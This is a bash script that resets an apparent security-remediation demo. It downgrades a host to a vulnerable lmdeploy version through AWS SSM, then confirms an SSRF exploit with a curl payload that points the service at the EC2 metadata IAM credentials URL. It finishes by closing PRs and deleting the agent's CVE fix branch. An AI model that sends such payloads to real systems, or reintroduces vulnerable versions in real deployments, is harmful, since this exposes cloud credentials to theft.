#!/usr/bin/env bash
# reset-demo.sh — Restore demo to a known starting state after a dry run.
# Usage: ./scripts/reset-demo.sh <instance-id> <test-ec2-endpoint>
set -euo pipefail

INSTANCE_ID="${1:?Usage: reset-demo.sh <instance-id> <test-ec2-endpoint>}"
EC2_ENDPOINT="${2:?Usage: reset-demo.sh <instance-id> <test-ec2-endpoint>}"
PROFILE_SSM="sia-nonprod-auto2"
PROFILE_CC="saml"
REGION="ap-southeast-1"
REPO="demo-app"

echo "=== Step 1: Downgrade host to vulnerable lmdeploy==0.12.2 ==="
aws ssm send-command \
  --profile "$PROFILE_SSM" --region "$REGION" \
  --instance-ids "$INSTANCE_ID" \
  --document-name AWS-RunShellScript \
  --parameters 'commands=["/opt/runwayzero/venv/bin/pip install lmdeploy==0.12.2", "systemctl restart runwayzero-demo"]' \
  --output text --query "Command.CommandId"

echo "Waiting 30s for service restart..."
sleep 30

echo "=== Step 2: Confirm exploit works ==="
curl -sf "$EC2_ENDPOINT/chat" \
  -d '{"image_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/Ec2InstanceProfile"}' \
  | head -c 200
echo ""

echo "=== Step 3: Close any open PRs ==="
aws codecommit list-pull-requests --profile "$PROFILE_CC" --region "$REGION" \
  --repository-name "$REPO" --pull-request-status OPEN \
  --query "pullRequestIds" --output text \
| xargs -n1 -I{} aws codecommit update-pull-request-status \
  --profile "$PROFILE_CC" --region "$REGION" \
  --pull-request-id {} --pull-request-status CLOSED 2>/dev/null || true

echo "=== Step 4: Delete agent feature branch ==="
aws codecommit delete-branch --profile "$PROFILE_CC" --region "$REGION" \
  --repository-name "$REPO" --branch-name runwayzero/cve-2026-33626 2>/dev/null || true

echo "=== Done. Demo is reset. ==="
